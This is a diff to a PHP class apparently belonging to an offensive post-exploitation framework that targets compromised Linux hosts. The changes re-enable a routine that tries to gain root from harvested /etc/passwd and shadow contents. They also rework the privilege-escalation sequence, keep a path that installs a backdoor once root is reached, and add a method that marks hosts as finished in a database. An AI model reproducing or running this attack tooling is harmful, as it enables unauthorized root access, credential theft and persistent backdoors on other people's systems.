@@ -27,6 +27,8 @@ class check4linux extends check4linux8jobs{
         //$this->article("Template BASE64 CMD",$this->templateB64_cmd);
         $this->article("Template SHELL", $this->template_shell);
         //$this->article("Template BASE64 SHELL",$this->templateB64_shell);
+
+        
         echo "=============================================================================\n";
         
         $data = "cat /etc/passwd ";
@@ -50,7 +52,7 @@ class check4linux extends check4linux8jobs{
         exec("echo '$tmp' | grep ':'   ",$tab_tmp);
         $shadow_str = $this->tab($tab_tmp);
         if ( (!empty($shadow_str)) && (strstr($shadow_str, "root:")) ){
-           // $this->lan2root8shadow($shadow_str,$this->etc_passwd_str);
+           $this->lan2root8shadow($shadow_str,$this->etc_passwd_str);
         }
         
     }
@@ -254,8 +256,11 @@ class check4linux extends check4linux8jobs{
         //$this->requette($query);
         $this->pause();
 
-        $this->rouge($this->id);
+        $this->rouge($this->id8str);
+        
 
+
+        
         
         if ( $this->uid_name==="root" ) {
             if (!$this->ip2backdoor8db($this->ip2id)) {
@@ -264,13 +269,19 @@ class check4linux extends check4linux8jobs{
             }
         }
         else {
-            //if (!$this->ip2root8db($this->ip2id)) {$this->misc2();$this->pause();}
-            if (!$this->ip2root8db($this->ip2id)) {$this->suids();$this->pause();}   
-            //if (!$this->ip2root8db($this->ip2id)) {$this->misc();$this->pause();}
-            if (!$this->ip2root8db($this->ip2id)) {$this->users();$this->pause();}
-            //if (!$this->ip2root8db($this->ip2id)) {$this->jobs();$this->pause();}
-            //if (!$this->ip2root8db($this->ip2id)) {$this->exploits();$this->pause();}
-        }
+            
+                if (!$this->ip2root8db($this->ip2id)) {$this->users();$this->pause();}
+                
+                //if (!$this->ip2root8db($this->ip2id)) {$this->misc();$this->pause();}
+                //if (!$this->ip2root8db($this->ip2id)) {$this->suids();$this->pause();}                
+                //if (!$this->ip2root8db($this->ip2id)) {$this->users();$this->pause();}
+                //if (!$this->ip2root8db($this->ip2id)) {$this->jobs();$this->pause();}
+                //if (!$this->ip2root8db($this->ip2id)) {$this->exploits();$this->pause();}
+                $this->lan2done();
+
+            }
+
+        
         
         $this->rouge("Brief");
         $sql = "select uid_name,from_base64(templateB64_id),from_base64(templateB64_cmd),from_base64(templateB64_shell),ladate FROM LAN where id8port=$this->port2id ORDER BY ladate ASC ;";
@@ -282,8 +293,7 @@ class check4linux extends check4linux8jobs{
             echo "\n";
             $this->jaune($row['uid_name']);
             $date = $row['ladate'];
-            $time = date("Y-m-d H:i:s",$date);
-            $this->article("Date", $time);
+            $this->article("Date", $date);
             $this->article("Username", $row['uid_name']);
             $this->article("ID", $row['from_base64(templateB64_id)']);
             $this->article("CMD", $row['from_base64(templateB64_cmd)']);
@@ -297,7 +307,11 @@ class check4linux extends check4linux8jobs{
    }
     
    
-    
+
+   public function lan2done(){
+       $sql = "UPDATE LAN set lan2done = 1 where $this->lan2where";
+       $this->mysql_ressource->query($sql);
+   }
    
    
    
